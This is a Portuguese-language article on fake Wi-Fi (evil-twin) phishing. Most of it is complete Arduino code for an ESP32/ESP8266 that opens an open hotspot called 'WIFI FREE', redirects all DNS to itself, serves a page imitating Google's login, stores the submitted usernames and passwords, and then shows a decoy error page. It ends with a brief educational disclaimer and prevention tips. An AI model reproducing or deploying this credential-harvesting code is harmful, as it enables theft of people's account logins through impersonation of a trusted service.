## Ataque de Phishing com Wi-Fi Falso: Uma Análise Técnica

### Introdução

Os ataques de **phishing** são uma das ameaças cibernéticas mais prevalentes na atualidade, visando enganar usuários para obter dados sensíveis, como credenciais de login, informações financeiras e outros dados pessoais. Um tipo sofisticado desse ataque é o **phishing via Wi-Fi falso**, onde um atacante cria uma rede Wi-Fi fraudulenta para capturar informações dos usuários. Este documento descreve um cenário em que um atacante configura um ponto de acesso falso (hotspot), simulando uma rede legítima, e utiliza uma página de login falsa para coletar as credenciais do usuário.

Este tipo de ataque é particularmente perigoso, pois explora a confiança natural dos usuários em redes Wi-Fi públicas e abertas. A seguir, detalharemos a técnica de ataque, seu funcionamento e as implicações de segurança.

### Como Funciona o Ataque de Phishing via Wi-Fi Falso?

O ataque de phishing via Wi-Fi falso consiste em criar um ponto de acesso com um nome (SSID) que imita uma rede legítima, induzindo os usuários a se conectarem. Uma vez conectados, os usuários são redirecionados a uma página de login falsa, que se passa por um serviço legítimo, como o Google. A página coleta as credenciais de login dos usuários, que são então enviadas ao atacante.

Este processo pode ser dividido em várias etapas:

#### 1. Criação do Ponto de Acesso Falso
O primeiro passo do ataque é configurar o ponto de acesso (hotspot) com um SSID que seja confiável ou reconhecível pelos usuários, como "WIFI FREE" ou "Wi-Fi Público". Para isso, é necessário um dispositivo que funcione como um ponto de acesso (geralmente um **ESP32** ou **ESP8266**), que possua capacidade de criar redes sem fio e atuar como servidor DNS e HTTP.

#### 2. Interceptação de Conexões de Rede
Quando um usuário se conecta ao ponto de acesso, o dispositivo configurado como "Wi-Fi falso" redireciona automaticamente a solicitação de DNS para um servidor controlado pelo atacante. Ou seja, quando o usuário tenta acessar qualquer site, a requisição é manipulada para que o usuário seja redirecionado para uma página de login falsa.

#### 3. Exibição da Página de Login Falsa
A página de login imita uma interface de login legítima, como a do Google. O atacante utiliza HTML e CSS para criar uma página visualmente idêntica à página real, a fim de enganar os usuários. A partir do momento em que o usuário insere suas credenciais e as envia, os dados são armazenados no servidor do atacante.

#### 4. Coleta das Credenciais
As credenciais do usuário são armazenadas no servidor do atacante, permitindo-lhe ter acesso a contas e outros dados pessoais do usuário. A coleta dessas credenciais pode ser feita diretamente em variáveis ou armazenada em arquivos de log para posterior análise.

#### 5. Exibição de uma Página de Erro (Opicional)
Após a submissão do formulário, o atacante pode exibir uma página de erro para confundir o usuário e fazer com que ele tente se reconectar à rede, o que reforça a confiança na rede falsa.

### Exemplo de Implementação: Código em Arduino

O código a seguir descreve como criar um ponto de acesso Wi-Fi falso utilizando um dispositivo como o **ESP32** ou **ESP8266**. O ponto de acesso exibe uma página de login falsa, coleta as credenciais do usuário e armazena essas informações.

```cpp
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// Configurações do ponto de acesso falso
const char* ssid = "WIFI FREE";  // Nome da rede falsa
const char* password = "";  // Sem senha

// Configuração do servidor DNS e servidor web
const byte DNS_PORT = 53;  // Porta DNS
IPAddress apIP(192, 168, 4, 1);  // IP da rede falsa
DNSServer dnsServer;  // Servidor DNS
WebServer server(80);  // Servidor web na porta 80

// Array para armazenar os logins
String users[10];  // Capacidade para até 10 credenciais
int userIndex = 0;  // Índice para o próximo login a ser armazenado

// Página de erro
const char* erroPage = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Erro de Rede</title>
    <style>
        body { display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f1f1f1; font-family: Arial, sans-serif; }
        .error-container { text-align: center; background-color: #ff4d4d; color: #fff; padding: 40px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); }
        h1 { font-size: 30px; margin-bottom: 20px; }
        p { font-size: 18px; margin-top: 0; }
        .retry-button { margin-top: 20px; padding: 10px 20px; font-size: 16px; background-color: #ff6666; border: none; border-radius: 5px; color: #fff; cursor: pointer; }
        .retry-button:hover { background-color: #ff3333; }
    </style>
</head>
<body>
    <div class="error-container">
        <h1>Erro na Rede</h1>
        <p>Ocorreu um erro ao tentar conectar-se à rede.</p>
        <button class="retry-button" onclick="window.location.reload();">Tentar Novamente</button>
    </div>
</body>
</html>
)rawliteral";

// Página de login falsa
const char* loginPage = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Google</title>
    <style>
    body { margin: 0; padding: 0; background-size: cover; font-family: 'Open Sans', sans-serif; }
    .box { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 30rem; padding: 3.5rem; box-sizing: border-box; border: 1px solid #dadce0; }
    .box h2 { margin: 0; text-align: center; color: #202124; font-size: 24px; }
    .box .inputBox { position: relative; }
    .box .inputBox input { width: 93%; padding: 1.3rem 10px; font-size: 1rem; letter-spacing: 0.062rem; margin-bottom: 1.875rem; border: 1px solid #ccc; background: transparent; border-radius: 4px; }
    .box input[type="submit"] { background-color: #1a73e8; color: #fff; padding: 0.625rem 1.25rem; cursor: pointer; border-radius: 0.312rem; font-size: 1rem; float: right; }
    .box input[type="submit"]:hover { background-color: #287ae6; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Entre com sua conta Google</h2>
        <form method="POST" action="/">
            <div class="inputBox">
                <input type="text" name="username" required placeholder="Email ou telefone" />
            </div>
            <div class="inputBox">
                <input type="password" name="password" required placeholder="Senha" />
            </div>
            <input type="submit" value="Entrar" />
        </form>
    </div>
</body>
</html>
)rawliteral";

// Função de configuração do ponto de acesso e DNS
void setup() {
    // Inicializa o ponto de acesso Wi-Fi
    WiFi.softAP(ssid, password);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    
    // Inicializa o servidor DNS
    dnsServer.start(DNS_PORT, "*", apIP);
    
    // Define as rotas do servidor web
    server.on("/", HTTP_GET, []() {
        server.send(200, "text/html", loginPage);
    });

    server.on("/", HTTP_POST, []() {
        String username = server.arg("username");
        String password = server.arg("password");
        
        // Armazena as credenciais dos usuários
        if (userIndex < 10) {
            users[userIndex++] = username + " : " + password;
        }
        server.send(200, "text/html", erroPage);
    });
    
    // Inicia o servidor web
    server.begin();
}

void loop() {
    dnsServer.processNextRequest();
    server.handleClient();
}
```

### Considerações de Segurança

O uso de redes Wi-Fi públicas sempre representa um risco à segurança dos

 usuários. Embora este exemplo seja didático e voltado para fins educacionais, é importante destacar que o uso malicioso de técnicas de phishing pode levar a sérias consequências legais. A prática de invadir redes alheias e coletar informações sem consentimento é ilegal e antiética.

### Prevenção e Proteção

1. **Conexão Segura**: Sempre que possível, os usuários devem evitar conectar-se a redes Wi-Fi públicas sem a devida segurança, utilizando redes privadas ou VPNs.
   
2. **Autenticação de Dois Fatores**: Ativar a autenticação de dois fatores (2FA) em serviços como Google, Facebook e outros pode fornecer uma camada extra de segurança, tornando as credenciais roubadas inúteis para os atacantes.

3. **Educação em Segurança Cibernética**: A conscientização dos usuários sobre os riscos de redes Wi-Fi públicas e sobre como verificar a autenticidade de páginas de login pode ser um passo importante na prevenção desses ataques.

### Conclusão

O phishing via Wi-Fi falso é uma técnica sofisticada que explora a confiança do usuário em redes públicas. Embora a implementação apresentada seja para fins educacionais, ela evidencia a necessidade de práticas rigorosas de segurança em redes sem fio e de vigilância constante para evitar ataques desse tipo. Em um cenário de ameaças cibernéticas crescentes, é essencial estar preparado para identificar e mitigar tais riscos.
